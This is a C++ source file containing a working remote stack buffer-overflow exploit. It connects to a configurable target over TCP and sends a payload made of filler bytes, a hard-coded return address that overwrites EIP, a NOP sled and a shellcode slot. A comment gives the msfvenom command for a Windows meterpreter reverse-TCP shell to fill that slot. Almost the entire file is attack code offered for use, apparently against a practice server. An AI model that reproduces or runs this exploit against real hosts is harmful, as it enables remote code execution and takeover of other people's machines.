#if defined(_WIN32)

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#define CLOSESOCKET(s) closesocket(s)
#define GETSOCKETERRNO() WSAGetLastError()
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

#define ISVALIDSOCKET(s) ((s) >= 0)
#define CLOSESOCKET(s) close(s)
#define SOCKET int
#define GETSOCKETERRNO() (errno)
#endif

#define TARGET "127.0.0.1" //Change to target host
#define TARGET_PORT "9999" //Change to target port

#include <iostream>
#include <string>
#include <cstring>
#include <stdio.h>
#include <stdlib.h>

void PrintStatus(std::string status_option, std::string status_value){
    std::cout << status_option << "\t . . . . . "  << status_value << std::endl;
}

int main(int argc, char* argv[]){
#if defined(_WIN32)
    WSADATA d;
    if(WSAStartup(MAKEWORD(2,2), &d)){
        PrintStatus("Initiate Winsock", "INITIALIZATION FAILED");
        exit(EXIT_FAILURE);
    }
    PrintStatus("Initiation of Winsock", "INITIALIZATION SUCCEEDED");
#endif

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_INET;
    struct addrinfo* peerAddress;
    if(getaddrinfo(TARGET, TARGET_PORT, &hints, &peerAddress)){
        PrintStatus("Host Translation", "HOST TRANSLATION FAILED");
        exit(EXIT_FAILURE);
    }

    PrintStatus("Host Translation", "HOST TRANSLATION DONE");

    char serviceBuffer[64];
    char addressBuffer[64];
    getnameinfo(peerAddress->ai_addr, peerAddress->ai_addrlen, addressBuffer, sizeof(addressBuffer), serviceBuffer, sizeof(serviceBuffer), NI_NUMERICHOST);
    PrintStatus("TARGET CHOOSED\t", addressBuffer + (std::string)":" + serviceBuffer);
    SOCKET socketPeer = socket(peerAddress->ai_family, peerAddress->ai_socktype, peerAddress->ai_protocol);   

    if(!ISVALIDSOCKET(socketPeer)){
        PrintStatus("INITIALIZING SOCKET", "FAILED TO INITIALIZED SOCKET");
        exit(EXIT_FAILURE);
    }

    if(connect(socketPeer, peerAddress->ai_addr, peerAddress->ai_addrlen) != 0){
        PrintStatus("CONNECTING TO TARGET", "CONNECTION FAILED");
        exit(EXIT_FAILURE);
    }
    PrintStatus("CONNECTING TO TARGET", "CONNECTION SUCCEEDED");
    freeaddrinfo(peerAddress);
    
    char ReceiveFirstBytes[4096];
    recv(socketPeer, ReceiveFirstBytes, 4096, 0);
    //std::cout << ReceiveFirstBytes << std::endl;
    PrintStatus("PREPARING EXPLOIT", "IN-PROGRESS");
    //Prepare buffer
    std::string filler = "\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55";
    std::string nops = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    std::string eip = "\xf3\x12\x17\x31";
    std::string buf = "SHELLCODE HERE"; //SHELLCODE HERE 
										//msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f c -b "\x00\x0a\x0d\xff"
    
    std::string payload = filler + eip + nops + buf;
    send(socketPeer, payload.c_str(), payload.length(), 0);
    //std::cout << payload << std::endl;
    //std::cout << "LEN : " << value.length() << std::endl;
    //std::cout << PAYLOAD << std::endl;
    /*PrintStatus("PAYLOAD LENGTH", payload.length() + " BYTES");
    PrintStatus("PREPARING EXPLOIT", "EXPLOIT READY TO FIRE");
    send(socketPeer, payload.c_str(), payload.length(), 0);
    PrintStatus("SENDING EXPLOIT\t", "EXPLOIT SENT");*/
}


